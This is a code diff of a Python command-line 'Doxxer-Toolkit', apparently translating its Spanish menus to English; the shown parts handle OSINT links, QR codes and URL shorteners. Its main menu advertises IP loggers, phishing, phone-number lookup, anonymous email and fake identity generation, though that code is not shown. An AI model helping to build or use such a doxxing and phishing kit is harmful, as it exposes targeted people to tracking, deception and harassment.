-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     elejir99 = int(input('>>: '))
     if elejir99 == 1:
       webbrowser.open('https://github.com/jivoi/awesome-osint')
@@ -746,7 +740,7 @@ def osintpa():
     elif elejir99 == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       os.system("clear")
       osintpa()
@@ -755,7 +749,7 @@ def osintpa():
   elif osint == 99:
     exit()
   else:
-    print('[~] Error opcion invalida.')
+    print('[~] Invalid option.')
     time.sleep(2)
     os.system("clear")
     osintpa()
@@ -763,19 +757,19 @@ def osintpa():
 def qrcodigo():
   os.system("clear")
   print(logo)
-  print('\n[~] Ingresa un texto o url para convertir a codigo qr')
-  s = input('[~] Ingresa un texto: ')
-  n = input('[~] Ingresa el nombre de la imagen: ')
+  print('\n[~] Enter a text or url to convert to qr code')
+  s = input('[~] Enter a text: ')
+  n = input('[~] Input the image name: ')
   d=n+".png"
   url=pyqrcode.create(s)
   url.show()
   url.png(d, scale =40)
-  print(f'{Colores.azul}[~] Imagen guardada en la carpeta de Doxxer-Toolkit con el nombre: {n}.png')
-  ll = input(f'{Colores.red}[~] Quieres regresar al menu principal? [Y/n]: ')
+  print(f'{Colores.azul}[~] Image saved in the Doxxer-Toolkit folder with the name: {n}.png')
+  ll = input(f'{Colores.red}[?]  Do you want to return to the main menu [Y/n]: ')
   if ll == "Y" or ll == "y":
     menu()
   elif ll == "N" or ll == "n":
-    print('[~] Saliendo el programa...')
+    print('[~] Exiting...')
     time.sleep(1)
     exit()
   else:
@@ -787,7 +781,7 @@ def cortarlink():
   os.system("clear")
   print(logo)
   print(' ')
-  print('\n[1] Cutt.ly (Requiere API Key)')
+  print('\n[1] Cutt.ly (Requires API Key)')
   print('\n[2] Shorturl')
   print('\n[3] n9.cl')
   print('\n[4] xurl.es')
@@ -796,23 +790,22 @@ def cortarlink():
   print('\n[7] Clck.ru')
   print('\n[8] Da.gd')
   print('\n[9] Is.gd')
-  print('\n[00] Regresar al menu principal')
-  print('\n[99] Salir')
+  print('\n[00] Back to main menu')
+  print('\n[99] Exit')
   cortarel = int(input('>> '))
   if cortarel == 1:
-    print('[~] Si no tienes una API Key de Cuttly tienes que crear una cuenta')
-    print('[~] Link de cuttly para acortar: https://cutt.ly/es')
-    key = input('[~] Ingresa tu API key de Cuttly: ')
+    print("[~] If you don't have a Cuttly API Key you need to create an account")
+    key = input('[~] Enter your Cuttly API key: ')
     s = pyshorteners.Shortener(api_key=key)
     url1 = input('[~] Link: ')
-    print(f'{Colores.azul} Link acortado:', s.cuttly.short(url1))
+    print(f'{Colores.azul} Shortened link:', s.cuttly.short(url1))
   elif cortarel == 2:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     shorurl = int(input('>> '))
     if shorurl == 1:
       webbrowser.open('https://shorturl.com/')
@@ -826,7 +819,7 @@ def cortarlink():
     elif shorurl == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       os.system("clear")
       print(logo)
@@ -834,10 +827,10 @@ def cortarlink():
   elif cortarel == 3:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     ncl = int(input('>> '))
     if ncl == 1:
       webbrowser.open('https://n9.cl/es')
@@ -851,7 +844,7 @@ def cortarlink():
     elif ncl == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       os.system("clear")
       print(logo)
@@ -859,10 +852,10 @@ def cortarlink():
   elif cortarel == 4:
     os.system("clear")
     print(logo)
-    print('\n[1] Abrir link para linux')
-    print('\n[2] Abrir link para termux')
-    print('\n[00] Regresar al menu principal')
-    print('\n[99] Salir')
+    print('\n[1] Open link for linux')
+    print('\n[2] Open link for termux')
+    print('\n[00] Back to main menu')
+    print('\n[99] Exit')
     xurl = int(input('>> '))
     if xurl == 1:
       webbrowser.open('https://www.xurl.es/')
@@ -876,7 +869,7 @@ def cortarlink():
     elif xurl == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       os.system("clear")
       print(logo)
@@ -884,24 +877,24 @@ def cortarlink():
   elif cortarel == 5:
     url = input('[~] Link: ')
     s = pyshorteners.Shortener()
-    print(f'{Colores.azul}[~] Link acortado:', s.tinyurl.short(url))
+    print(f'{Colores.azul}[~] Shortened link:', s.tinyurl.short(url))
     time.sleep(2)
   elif cortarel == 6:
     url = input('[~] Link: ')
     s = pyshorteners.Shortener()
-    print(f'{Colores.azul}[~] Link acortado:', s.chilpit.short(url))
+    print(f'{Colores.azul}[~] Shortened link:', s.chilpit.short(url))
   elif cortarel == 7:
     url = input('[~] Link: ')
     s = pyshorteners.Shortener()
-    print(f'{Colores.azul}[~] Link acortado:', s.clckru.short(url))
+    print(f'{Colores.azul}[~] Shortened link:', s.clckru.short(url))
   elif cortarel == 8:
     url = input('[~] Link: ')
     s = pyshorteners.Shortener()
-    print(f'{Colores.azul}[~] Link acortado:', s.dagd.short(url))
+    print(f'{Colores.azul}[~] Shortened link:', s.dagd.short(url))
   elif cortarel == 9:
     url = input('[~] Link: ')
     s = pyshorteners.Shortener()
-    print(f'{Colores.azul}[~] Link acortado:', s.isgd.short(url))
+    print(f'{Colores.azul}[~] Shortened link:', s.isgd.short(url))
   elif cortarel == 00:
     menu()
   elif cortarel == 99:
@@ -911,23 +904,23 @@ def menu():
     os.system("clear")
     print(logo)
     print(Colores.red + '''
-    [~] Bienvenido a Doxxer Toolkit!
+    [~] Welcome to AqudiTools!
                       
     [1] IPloggers      
-    [2] Geolocalizar IP             
-    [3] Obtener informacion de un numero
+    [2] Geolocate IP           
+    [3] Get information from a phone number
     [4] Phishing       
     [5] SMS                        
-    [6] Correos Electronicos anonimos    
-    [7] Buscar usuario 
-    [8] Generar informacion falsa
-    [9] Paginas OSINT
-    [10] Acortadores de links
-    [11] Generar codigo QR
+    [6] Anonymous emails   
+    [7] User search 
+    [8] Generate fake information
+    [9] OSINT Pages
+    [10] Link shorteners
+    [11] Generate qr code
     [12] OSINT Email (BETA)
 
     [98] Update checker
-    [99] Salir
+    [99] Exit
     ''')
     elejir = int(input('\n>> '))
     if elejir == 1:
@@ -953,24 +946,24 @@ def menu():
     elif elejir == 11:
       qrcodigo()
     elif elejir == 12:
-       os.system("python3 modules/emails.py")
+       os.system("python3 modules/emails_en.py")
     elif elejir == 98:
         version = requests.get('https://raw.githubusercontent.com/Euronymou5/Doxxer-Toolkit/main/version.txt')
         if version.status_code == 200:
             c = version.text
             ola = c.strip()
             if Version == ola:
-                print(f'\n{Colores.verde}[~] No hay versiones disponibles.')
-                m = input(f'\n{Colores.red}[~] Presiona enter para continuar...')
+                print(f'\n{Colores.verde}[~] No versions available.')
+                m = input(f'\n{Colores.red}[~] Press enter to continue...')
                 menu()
             else:
-                print(f'\n{Colores.verde}[~] Hay una nueva version disponible: {ola}')
-                m = input(f'\n{Colores.red}[~] Presiona enter para continuar...')
+                print(f'\n{Colores.verde}[~] A new version is available: {ola}')
+                m = input(f'\n{Colores.red}[~] Press enter to continue...')
                 menu()
     elif elejir == 99:
       exit()
     else:
-      print('[~] Error opcion invalida.')
+      print('[~] Invalid option.')
       time.sleep(2)
       os.system("clear")
       menu()
